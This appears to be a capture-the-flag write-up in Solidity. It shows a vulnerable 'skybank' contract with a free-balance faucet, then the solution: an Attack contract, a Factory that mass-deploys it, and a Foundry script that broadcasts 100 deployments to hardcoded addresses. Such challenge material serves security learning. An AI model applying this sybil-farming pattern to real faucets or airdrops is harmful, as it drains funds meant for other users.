# 薅羊毛

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract skybank {
    mapping(address => uint) public balances;

    // event sendflag(string base64email,string md5namectf);
    // bytes20 addr = bytes20(msg.sender);

    // function ObtainFlag(string memory base64email,string memory md5namectf)public{
    //     require(balances[msg.sender] >= 1000000000);
    //     emit sendflag(base64email,md5namectf);
    // }

    function gether() public {
        require(balances[msg.sender] == 0);
        balances[msg.sender] += 10000000;
    }

    function Transfer(address to, uint bur) public {
        require(bur == balances[msg.sender]);
        balances[to] += bur;
        balances[msg.sender] -= bur;
    }

    function getbalances(address _addr) external view returns (uint256) {
        return balances[_addr];
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface ISkybank {
    function Transfer(address to, uint bur) external;

    function gether() external;

    function getbalances(address _addr) external view returns (uint256);
}

contract Attack {
    constructor(address addr, address eoa) {
        ISkybank iskybank = ISkybank(addr);
        iskybank.gether();
        iskybank.Transfer(address(iskybank), 10000000);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "./Attack.sol";

contract Factory {
    address public skybank;
    address public owner;

    constructor(address _skybank) {
        skybank = _skybank;
        owner = msg.sender;
    }

    function factory(uint256 x) external {
        require(msg.sender == owner, "not owner");
        for (uint i = 0; i < x; i++) {
            new Attack(skybank, owner);
        }
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Factory} from "../src/factory.sol";
import {Script, console} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface Iillit {
    function getbalances(address _addr) external view returns (uint256);
}

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Iillit illit = Iillit(0x700b6A60ce7EaaEA56F065753d8dcB9653dbAD35);
        Factory factory = Factory(0xA15BB66138824a1c7167f5E85b957d04Dd34E468);
        factory.factory(100);
        uint256 result = illit.getbalances(
            address(0x700b6A60ce7EaaEA56F065753d8dcB9653dbAD35)
        );
        console.log("balance:", result);
        vm.stopBroadcast();
    }
}

```



> 更新: 2025-08-01 20:58:36  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/att0b0gdkpc45dth>